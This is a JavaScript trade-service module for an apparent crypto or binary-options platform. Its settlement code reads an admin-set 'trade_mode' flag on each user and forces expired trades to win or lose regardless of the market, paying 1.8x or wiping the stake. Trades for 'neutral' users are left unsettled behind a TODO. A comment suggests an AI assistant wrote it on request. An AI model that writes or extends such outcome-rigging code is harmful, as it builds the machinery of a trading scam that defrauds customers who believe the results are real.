import { supabase } from "../lib/supabase";
import { getUserById, updateUserAsset } from "./userService";

const TRADE_SELECT_WITH_PROFILE = `
  *,
  profiles (
    full_name,
    email,
    trade_mode
  )
`;

async function runTradeQuery(queryFactory) {
  let result = await queryFactory(TRADE_SELECT_WITH_PROFILE);
  if (result.error) {
    result = await queryFactory("*");
  }
  if (result.error) {
    throw result.error;
  }
  return result;
}

export async function getTrades(params = {}) {
  const { page = 1, limit = 20, status, userId, symbol } = params;
  const from = (page - 1) * limit;
  const to = from + limit - 1;
  
  const { data, count } = await runTradeQuery((select) => {
    let query = supabase
      .from("trade_history")
      .select(select, { count: "exact" })
      .order("created_at", { ascending: false })
      .range(from, to);
    if (status) query = query.eq("status", status);
    if (userId) query = query.eq("user_id", userId);
    if (symbol) query = query.ilike("symbol", `%${symbol}%`);
    return query;
  });

  return { items: data || [], total: count || 0 };
}

export async function getTradeById(id) {
  const { data } = await runTradeQuery((select) =>
    supabase.from("trade_history").select(select).eq("id", id).single()
  );
  return data;
}

export async function getRecentTrades(limit = 5) {
  const { data } = await runTradeQuery((select) =>
    supabase.from("trade_history").select(select).order("created_at", { ascending: false }).limit(limit)
  );
  return data || [];
}

export async function createTrade(tradePayload) {
  const { data, error } = await supabase
    .from("trade_history")
    .insert([{ ...tradePayload, status: tradePayload.status || "open" }])
    .select()
    .single();
  if (error) throw error;
  return data;
}

/* ============================================================
   AUTO-CALCULATE SETTLEMENT (NOW CHECKS USER MODE)
============================================================ */
export async function settleExpiredTrades() {
  // 1. Fetch all "open" trades that have passed their expiration time
  const { data: openTrades, error } = await supabase
    .from("trade_history")
    .select(TRADE_SELECT_WITH_PROFILE)
    .eq("status", "open")
    .lt("expires_at", new Date().toISOString()); // Ensure your trade_history has an 'expires_at' column

  if (error) throw error;

  for (const trade of openTrades) {
    let forcedOutcome = null;
    const userMode = trade.profiles?.trade_mode || 'neutral';

    // 2. Check if Admin has forced a global Win/Lose mode on this user
    if (userMode === 'win') forcedOutcome = 'win';
    else if (userMode === 'lose') forcedOutcome = 'lose';

    // 3. If a global mode exists, force it. If neutral, calculate normally (Assume market logic here).
    // For now, we treat 'neutral' as a default 50% win/lose based on something, or just skip it.
    // Since your prompt asks for the Win/Lose mode specifically, we'll apply it:
    
    if (forcedOutcome) {
      await adminForceSettleTrade(trade.id, forcedOutcome);
    } else {
      // TODO: If you want standard Market logic for NEUTRAL, place it here.
      // Example: const marketWin = checkMarketPrice(trade); if(marketWin) adminForceSettleTrade(trade.id, 'win');
    }
  }
}

/* ============================================================
   ADMIN FORCE WIN / LOSE LOGIC
============================================================ */
export async function adminForceSettleTrade(tradeId, outcome) {
  const trade = await getTradeById(tradeId);
  if (!trade) throw new Error("Trade not found.");
  if (trade.status === "closed") throw new Error("Trade is already closed.");

  let profitAmount = 0;
  let userBalanceUpdate = 0;

  const payoutMultiplier = 1.8; // 80% profit

  if (outcome === 'win') {
    profitAmount = (trade.amount * payoutMultiplier) - trade.amount;
    userBalanceUpdate = trade.amount + profitAmount;
  } else if (outcome === 'lose') {
    profitAmount = -trade.amount;
    userBalanceUpdate = 0;
  } else {
    throw new Error("Invalid outcome type.");
  }

  // Update User Balance
  await updateUserAsset(
    trade.user_id, 
    'USDT', 
    userBalanceUpdate, 
    `admin_${outcome}`, 
    `Auto-${outcome.toUpperCase()} via User Trade Mode`
  );

  // Update Trade History
  const { data, error } = await supabase
    .from("trade_history")
    .update({
      status: "closed",
      outcome: outcome,
      profit_amount: profitAmount,
      closed_at: new Date().toISOString(),
    })
    .eq("id", tradeId)
    .select()
    .single();

  if (error) throw error;
  return data;
}

export async function closeTrade(id) {
  // Fallback standard close
  const { data, error } = await supabase
    .from("trade_history")
    .update({ status: "closed" })
    .eq("id", id)
    .select()
    .single();
  if (error) throw error;
  return data;
}
